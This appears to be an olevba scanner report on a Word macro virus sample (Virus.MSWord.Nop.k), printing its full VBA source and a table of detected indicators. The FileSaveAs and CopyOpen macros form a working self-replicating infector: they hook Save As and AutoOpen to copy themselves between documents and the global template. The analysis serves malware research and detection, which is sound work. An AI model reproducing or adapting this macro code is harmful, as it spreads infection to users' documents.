olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nop.k-a1c6a0d0fb71fcefa3d92fe64d49fff561a6e0e2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nop.k-a1c6a0d0fb71fcefa3d92fe64d49fff561a6e0e2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Nop.k-a1c6a0d0fb71fcefa3d92fe64d49fff561a6e0e2 - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Who$
Rem /////////////////////////////////
Rem /Made in Jakutsk by me          /
Rem /That's engoy to prove my power /
Rem /Say by to you files            /
Rem /              :)               /
Rem /////////////////////////////////
On Error GoTo -1: On Error GoTo lll
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
Who$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 4)
WordBasic.MacroCopy "FileSaveAs", Who$ + ":CopySaveAs"
WordBasic.MacroCopy "CopyOpen", Who$ + ":AutoOpen"
WordBasic.FileSaveAs dlg
lll:
End Sub
-------------------------------------------------------------------------------
VBA MACRO CopyOpen.bas 
in file: Virus.MSWord.Nop.k-a1c6a0d0fb71fcefa3d92fe64d49fff561a6e0e2 - OLE stream: 'Macros/VBA/CopyOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Who$
Rem /////////////////////////////////
Rem /Made in Jakutsk by me          /
Rem /That's engoy to prove my power /
Rem /Say by to you files            /
Rem /              :)               /
Rem /////////////////////////////////
Who$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 4)
WordBasic.MacroCopy Who$ + ":CopySaveAs", "FileSaveAs"
WordBasic.MacroCopy Who$ + ":AutoOpen", "CopyOpen"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

